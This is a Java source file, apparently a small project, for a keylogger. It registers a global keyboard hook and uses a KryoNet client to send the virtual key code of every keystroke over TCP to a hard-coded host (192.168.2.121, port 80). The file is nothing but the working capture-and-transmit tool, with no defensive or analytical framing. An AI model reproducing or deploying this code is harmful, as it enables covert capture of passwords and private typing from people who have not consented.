package logger;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.esotericsoftware.kryonet.Client;

import java.io.IOException;

public class KeyLogger {

    static Logger logger = LoggerFactory.getLogger(KeyLogger.class);

    private static Client client;

    private static boolean run = true;

    public static void main(String[] args) throws IOException {
        client = new Client();
        client.getKryo().register(Integer.class);
        client.start();
        client.connect(5000, "192.168.2.121", 80, 80);

        // might throw a UnsatisfiedLinkError if the native library fails to load or a RuntimeException if hooking fails
        GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true); // use false here to switch to hook instead of raw input

        System.out.println("Global keyboard hook successfully started, press [escape] key to shutdown. Connected keyboards:");
        //for(Entry<Long,String> keyboard:GlobalKeyboardHook.listKeyboards().entrySet())
            //System.out.format("%d: %s\n", keyboard.getKey(), keyboard.getValue());

        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
            @Override public void keyPressed(GlobalKeyEvent event) {
                System.out.println(event);
                client.sendTCP(event.getVirtualKeyCode());
                //logger.info(String.valueOf(event.getKeyChar()));
                /**switch (event.getVirtualKeyCode()) {
                    case GlobalKeyEvent.VK_ESCAPE:
                        run = false;
                        break;
                    case GlobalKeyEvent.VK_SHIFT:
                        logger.info("SHIFT");
                        break;
                    case GlobalKeyEvent.VK_EXECUTE:
                        logger.info("ENTER");
                }**/
            }
            //@Override public void keyReleased(GlobalKeyEvent event) {
            //    System.out.println(event.getKeyChar() + " up"); }
        });

        try {
            while(run) Thread.sleep(128);
        } catch(InterruptedException e) { /* nothing to do here */ }
        finally { keyboardHook.shutdownHook(); }
    }
}
